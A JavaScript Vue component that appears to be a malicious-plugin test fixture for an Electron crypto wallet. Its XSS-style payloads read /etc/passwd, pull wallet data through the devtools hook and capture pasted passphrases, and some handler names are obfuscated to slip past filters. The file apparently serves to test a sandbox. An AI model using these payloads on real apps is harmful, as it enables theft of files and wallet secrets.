module.exports = {
  template: `
    <div>
      <div v-html="onclick"></div>
      <div v-html="onclick2"></div>

      {{ something }}

      <a href="javascript:void(0)" onc` + `lick="const bla = (e) => {
        console.log('event', e)
        console.log(window.require('fs').readFileSync('/etc/passwd'))
      }; bla()">
        log /etc/passwd
      </a>

      <a href="javascript:bla = (e) => {
        console.log('event', e)
        console.log(window.require('fs').readFileSync('/etc/passwd'))
      }; bla()">
        log /etc/passwd
      </a>

      <iframe
        src="about:blank"
        onload="setInterval(() => {
          console.log('load wallets')
          console.log('window', window)
          console.log('document', { ...document })

          const profileId = window.__VUE_DEVTOOLS_GLOBAL_HOOK__.store.getters['session/profileId']
          const wallets = window.__VUE_DEVTOOLS_GLOBAL_HOOK__.store.getters['wallet/byProfileId'](profileId)
          console.log(wallets)
        }, 10000)"
      />

      <iframe
        src="about:blank"
        onload="setInterval(() => {
          const fs = window.require('fs')

          console.log(fs.readFileSync('/etc/passwd'))
        }, 10000)"
      />

      <iframe
        src="about:blank"
        onload="setInterval(() => {
          const $input = document.querySelector('input[name=passphrase]')
          console.log('input', $input, { ...$input })
          if ($input) {
            $input.addEventListener('paste', event => {
              const pasted = event.clipboardData.getData('text')
              console.info('While I am sending all your funds to Juan, please consider not using ' + pasted + ' anymore')
            })
            $input.addEventListener('change', event => {
              console.log('input change', $input.value)
            })
          }
        }, 10000)"
      />
    </div>
  `,

  data () {
    const c = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']

    return {
      something: '<a onclick="alert(\'...\')">...</a>',
      onclick: '<a href="javascript:void(0)" oncl' + 'ick="setImmediate(() => { console.log(window.require(\'fs\').readFileSync(\'/etc/passwd\')) })">Exploit</a>',
      onclick2: '<a href="javascript:void(0)" ' + c[14] + c[13] + c[2] + c[11] + c[8] + c[2] + c[10] + '="setImmediate(() => { console.log(window.require(\'fs\').readFileSync(\'/etc/passwd\')) })">Exploit</a>'
    }
  }
}
